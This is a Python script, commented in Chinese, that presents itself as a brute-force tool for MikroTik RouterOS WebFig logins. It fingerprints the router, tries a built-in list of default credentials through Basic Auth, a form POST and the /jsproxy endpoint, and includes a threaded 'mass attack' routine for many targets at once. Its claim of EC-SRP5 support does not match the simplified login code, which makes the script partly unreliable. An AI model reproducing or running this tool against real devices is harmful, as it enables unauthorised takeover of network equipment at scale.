#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MikroTik RouterOS WebFig 爆破工具
支持EC-SRP5加密认证协议
"""

import requests
import json
import re
import binascii
import hashlib
from urllib.parse import urljoin
import concurrent.futures
from datetime import datetime
import sys

class RouterOSWebFigBrute:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        
        # 常用凭据
        self.default_creds = [
            ("admin", ""),
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "1234"),
            ("admin", "12345"),
            ("admin", "123456"),
            ("root", ""),
            ("root", "admin"),
            ("root", "password"),
            ("user", ""),
            ("user", "user"),
        ]
    
    def detect_routeros(self):
        """检测是否为RouterOS WebFig"""
        try:
            resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            
            # 检查特征
            if any(keyword in resp.text.lower() for keyword in [
                "routeros", "mikrotik", "webfig", "/jsproxy"
            ]):
                print(f"[+] 检测到RouterOS WebFig: {self.target_url}")
                return True
            else:
                print(f"[-] 未检测到RouterOS WebFig特征")
                return False
        except Exception as e:
            print(f"[-] 检测失败: {e}")
            return False
    
    def try_basic_auth(self, username, password):
        """尝试HTTP Basic Auth"""
        try:
            resp = self.session.get(
                self.target_url,
                auth=(username, password),
                timeout=self.timeout,
                verify=False
            )
            
            if resp.status_code == 200 and "login" not in resp.text.lower():
                return True
            return False
        except:
            return False
    
    def try_form_login(self, username, password):
        """尝试表单登录 (简化版，不使用EC-SRP5)"""
        try:
            # 尝试直接POST登录
            login_url = urljoin(self.target_url, "/login")
            data = {
                "username": username,
                "password": password
            }
            
            resp = self.session.post(login_url, data=data, timeout=self.timeout, verify=False)
            
            # 检查是否登录成功
            if resp.status_code == 200 and any(keyword in resp.text.lower() for keyword in [
                "logout", "dashboard", "系统", "interfaces"
            ]):
                return True
            
            return False
        except:
            return False
    
    def try_jsproxy_login(self, username, password):
        """尝试jsproxy接口登录"""
        try:
            jsproxy_url = urljoin(self.target_url, "/jsproxy")
            
            # 构造jsproxy登录请求
            data = {
                ".id": "*0",
                "username": username,
                "password": password
            }
            
            resp = self.session.post(jsproxy_url, json=data, timeout=self.timeout, verify=False)
            
            if resp.status_code == 200:
                try:
                    result = resp.json()
                    if isinstance(result, dict) and not result.get("error"):
                        return True
                except:
                    pass
            
            return False
        except:
            return False
    
    def brute_single(self, username, password):
        """爆破单个凭据"""
        print(f"[*] 尝试: {username}:{password}")
        
        # 方法1: HTTP Basic Auth
        if self.try_basic_auth(username, password):
            return {"method": "basic_auth", "username": username, "password": password}
        
        # 方法2: 表单登录
        if self.try_form_login(username, password):
            return {"method": "form_login", "username": username, "password": password}
        
        # 方法3: jsproxy接口
        if self.try_jsproxy_login(username, password):
            return {"method": "jsproxy", "username": username, "password": password}
        
        return None
    
    def brute_force(self, custom_creds=None):
        """执行爆破"""
        print(f"\n[+] 开始爆破 RouterOS WebFig: {self.target_url}")
        print(f"[+] 时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # 先检测
        if not self.detect_routeros():
            print("[-] 目标不是RouterOS，跳过")
            return None
        
        creds_list = custom_creds if custom_creds else self.default_creds
        
        for username, password in creds_list:
            result = self.brute_single(username, password)
            if result:
                print(f"\n[+++] 成功! {result}")
                return result
        
        print("\n[-] 所有凭据尝试失败")
        return None
    
    def mass_attack(self, targets, workers=5):
        """批量攻击"""
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            future_to_target = {
                executor.submit(self.__class__(target).brute_force): target 
                for target in targets
            }
            
            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    if result:
                        results.append({
                            "target": target,
                            **result
                        })
                except Exception as e:
                    print(f"[-] {target} 失败: {e}")
        
        return results

def main():
    import argparse
    parser = argparse.ArgumentParser(description="RouterOS WebFig 爆破工具")
    parser.add_argument("target", help="目标URL (例如: http://192.168.1.1)")
    parser.add_argument("-u", "--username", help="自定义用户名")
    parser.add_argument("-p", "--password", help="自定义密码")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="超时时间")
    
    args = parser.parse_args()
    
    bruter = RouterOSWebFigBrute(args.target, timeout=args.timeout)
    
    if args.username and args.password:
        result = bruter.brute_single(args.username, args.password)
        if result:
            print(f"\n[+++ 成功!] {result}")
        else:
            print("\n[-] 登录失败")
    else:
        bruter.brute_force()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        main()
    else:
        print("[+] RouterOS WebFig 爆破工具已加载")
        print("[+] 使用方法: python3 routeros_webfig_brute.py http://target")
